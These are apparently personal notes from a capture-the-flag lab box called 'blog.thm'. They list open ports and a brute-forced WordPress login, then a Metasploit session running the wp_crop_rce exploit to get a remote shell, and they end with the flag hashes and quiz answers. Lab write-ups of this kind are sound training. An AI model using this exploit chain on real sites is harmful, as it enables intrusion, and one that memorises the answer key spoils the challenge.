@@ -1,0 +1,48 @@
+Open 10.10.218.53:22
+Open 10.10.218.53:80
+Open 10.10.218.53:445
+Open 10.10.218.53:139
+
+
+[80][http-post-form] host: blog.thm   login: kwheel   password: cutiepie1  
+
+
+
+=> msfconsole
+=> search image-crop
+msf6 exploit(multi/http/wp_crop_rce) > set RHOSTS 
+RHOSTS => 
+msf6 exploit(multi/http/wp_crop_rce) > set RHOSTS
+RHOSTS => 
+msf6 exploit(multi/http/wp_crop_rce) > set RHOSTS blog.thm
+RHOSTS => blog.thm
+msf6 exploit(multi/http/wp_crop_rce) > set USERNAME kwheel
+USERNAME => kwheel
+msf6 exploit(multi/http/wp_crop_rce) > set LHOST {IP}
+LHOST => 10.18.29.75                                                              
+msf6 exploit(multi/http/wp_crop_rce) > show options
+msf6 exploit(multi/http/wp_crop_rce) > set PASSWORD cutiepie1
+PASSWORD => cutiepie1
+=> run
+=> shell
+then 
+priv esc
+
+
+
+
+cat root.txt
+9a0b2b618bef9bfa7ac28c1353d9f318
+find / -type f -name user.txt 2>/dev/null
+/home/bjoel/user.txt
+/media/usb/user.txt
+cat /media/usb/user.txt
+c8421899aae571f7af486492b71a8ab7
+
+
+answers
+9a0b2b618bef9bfa7ac28c1353d9f318
+c8421899aae571f7af486492b71a8ab7
+/media/usb
+wordpress
+5.0
